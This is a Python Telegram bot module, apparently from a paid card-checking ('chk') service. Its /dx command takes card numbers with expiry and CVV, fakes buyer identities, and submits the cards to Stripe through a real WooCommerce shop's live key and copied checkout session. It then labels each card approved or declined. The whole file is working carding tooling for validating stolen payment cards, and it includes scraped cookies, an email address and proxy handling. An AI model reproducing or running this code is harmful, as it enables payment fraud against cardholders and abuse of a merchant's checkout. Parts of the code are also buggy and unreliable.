from pyrogram import Client
from pyrogram import filters
import time
import re
import requests
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from datetime import datetime
import json
from gates.textos import *
import random
import string
import asyncio
import os
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌"
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

@Client.on_message(filters.command('dx',prefixes=['.','!','/',',','-','$','%','#']))
async def st(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "dx"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Stank</code>
Gateway: <code>Stripe + Woo $15.50</code>
Estados: <code>❌</code>
Format: <code>/dx cc|month|year|cvv.</code></b>""")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''<b>Command: <code>TP</code>
Gateway: <code>Stripe + Woo $15.50</code>
Estados: <code>✅</code>
Format: <code>/ku cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})


    balon= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = requests.post('https://m.stripe.com/6', headers=balon).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    random_data = json.loads(res.text)
    phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
    first_name = random_data['results'][0]['name']['first']
    last_name = random_data['results'][0]['name']['last']
    street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
    city = random_data['results'][0]['location']['city']
    state = random_data['results'][0]['location']['state']
    zip = random_data['results'][0]['location']['postcode']
    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
    reply = await message.reply_text("<b>Cargando proceso...</b>")  
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxy = await verificar_proxies(archivo)
    
    cc = input[0]
    mes = input[1]
    ano = input[2]
    cvv = input[3]
    req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()          
    brand = req['brand']
    country = req['country']
    country_name = req['country_name']
    country_flag = req['country_flag']
    bank = req['bank']
    level = req['level']
    typea  = req['type']
    users = message.from_user.username
    bin = cc[:6]
    moneda = req['country_currencies']
    reqs = requests.get(f"https://lookup.binlist.net/{cc}").json()
    scheme = reqs["scheme"]
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


    x = get_bin_info (cc[0:6])

#-----------------------------------------------------------------------------------------------


    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        proxies =  {
            'http': f'{proxs}', 
            'https': f'{proxs}'
}
        
        
        
        
    url = 'https://egotrips-store.com/'

    cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fegotrips-store.com%2Fpayment-options%2F',
    '_fbp': 'fb.1.1698302273638.379778952',
    '_ga': 'GA1.2.2057876461.1698302274',
    '_gid': 'GA1.2.285361335.1698302274',
    'borlabs-cookie': '%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%5D%7D%2C%22domainPath%22%3A%22egotrips-store.com%2F%22%2C%22expires%22%3A%22Thu%2C%2025%20Apr%202024%2006%3A37%3A56%20GMT%22%2C%22uid%22%3A%22anonymous%22%2C%22version%22%3A%223%22%7D',
    'wp_woocommerce_session_e5d75aa8b57902422ea37623d87dc615': 't_88d7378c9b5f9adbccdc1461e37257%7C%7C1698475094%7C%7C1698471494%7C%7Cde471c55191d823d1827252c0aa2561b',
    'woocommerce_recently_viewed': '17173',
    '__stripe_mid': 'c0ec8f3d-4608-4c2f-9310-72d2127708e0cf2531',
    '__stripe_sid': '2c2f8a94-7deb-4906-b619-868fb83dafc88cdace',
    'woocommerce_items_in_cart': '1',
    'mailchimp.cart.current_email': 'jbebe2755@gmail.com',
    'mailchimp_user_email': 'jbebe2755%40gmail.com',
    'woocommerce_cart_hash': '76bdd041d5f8142586ead0bedaf0ae1a',
}

    headers = {
    'authority': 'egotrips-store.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fegotrips-store.com%2Fpayment-options%2F; _fbp=fb.1.1698302273638.379778952; _ga=GA1.2.2057876461.1698302274; _gid=GA1.2.285361335.1698302274; borlabs-cookie=%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%5D%7D%2C%22domainPath%22%3A%22egotrips-store.com%2F%22%2C%22expires%22%3A%22Thu%2C%2025%20Apr%202024%2006%3A37%3A56%20GMT%22%2C%22uid%22%3A%22anonymous%22%2C%22version%22%3A%223%22%7D; wp_woocommerce_session_e5d75aa8b57902422ea37623d87dc615=t_88d7378c9b5f9adbccdc1461e37257%7C%7C1698475094%7C%7C1698471494%7C%7Cde471c55191d823d1827252c0aa2561b; woocommerce_recently_viewed=17173; __stripe_mid=c0ec8f3d-4608-4c2f-9310-72d2127708e0cf2531; __stripe_sid=2c2f8a94-7deb-4906-b619-868fb83dafc88cdace; woocommerce_items_in_cart=1; mailchimp.cart.current_email=jbebe2755@gmail.com; mailchimp_user_email=jbebe2755%40gmail.com; woocommerce_cart_hash=76bdd041d5f8142586ead0bedaf0ae1a',
    'origin': 'https://egotrips-store.com',
    'referer': 'https://egotrips-store.com/checkout/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'checkout',
}

    data = {
    'billing_title': '0',
    'billing_first_name': 'Carlo',
    'billing_last_name': 'Wili',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': '13',
    'billing_address_2': '',
    'billing_city': 'New york',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '18080562',
    'billing_email': 'jbebe2755@gmail.com',
    'mailchimp_woocommerce_gdpr[5af2201481]': '0',
    'ship_to_different_address': '1',
    'shipping_title': '0',
    'shipping_address_type': 'regular',
    'shipping_first_name': 'Carlo',
    'shipping_last_name': 'Wili',
    'shipping_company': '',
    'shipping_country': 'US',
    'shipping_dhl_postnumber': '',
    'shipping_address_1': '13',
    'shipping_address_2': 'Casa',
    'shipping_city': 'Nueva york',
    'shipping_state': 'NY',
    'shipping_postcode': '10080',
    'order_comments': '',
    'payment_method': 'stripe',
    'terms': '1',
    'legal': 'on',
    'legal-field': '1',
    'shipping_method[0]': 'flat_rate:6',
    'woocommerce-process-checkout-nonce': [
        '48001baa6c',
        '48001baa6c',
    ],
    'stripe_source': 'pm_1O5NGsLeZ5Pop4jp3DkVhGZa',
}
    
    response = requests.get(url, params=params, cookies=cookies, headers=headers, data=data)
    await asyncio.sleep(10)
    #decoded_response = response.text
    #result = json.loads(decoded_response)
    #id = result['id']
    #id2 = result['client_secret']
    url = 'https://api.stripe.com/v1/payment_methods'

    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
    
    time.sleep(10)
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&billing_details[name]=Carlo+Wili&billing_details[address][line1]=13&billing_details[address][city]=New+york&billing_details[address][postal_code]=10080&billing_details[address][country]=UM&billing_details[email]=jbebe2755%40gmail.com&billing_details[phone]=18080562&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=ac058ca6-8d76-4795-b9c0-759d69240d9c2327b7&muid=c0ec8f3d-4608-4c2f-9310-72d2127708e0cf2531&sid=2c2f8a94-7deb-4906-b619-868fb83dafc88cdace&payment_user_agent=stripe.js%2Fbf13fe01f4%3B+stripe-js-v3%2Fbf13fe01f4%3B+card-element&referrer=https%3A%2F%2Fegotrips-store.com&time_on_page=150552&key=pk_live_GksBhk54NL0OBC6pQ3In6DxL00kigGnWo1'
        
    response = requests.post(url, headers=headers, data=data)

    respo = response.json()
    result2 = response.json()
    if 'error' in result2:
              errormessage = result2['error']['message'] + ' ' + result2['error']['code']
              dedoeError = result2['error']['code']
              
    else:
               errormessage = result2['status']
        
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/+rtV8voEx9vA0ODRh"),
               
            ]
        ]
    )
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
    if 'message' in result2 and result2['message'] == 'succeeded':
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe + Woo </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>
""", disable_web_page_preview=True,
            reply_markup=keyboard)
    elif(errormessage=="Your card's security code is incorrect. incorrect_cvc"):
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved CCN! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe + Woo </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard)
            
    else:
        await reply.edit_text(f"""<b>Hxck 4x4 𝙲𝚑𝚔 𝙱𝚘𝚝

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Declined! ❌
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe + Woo </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard) 
            
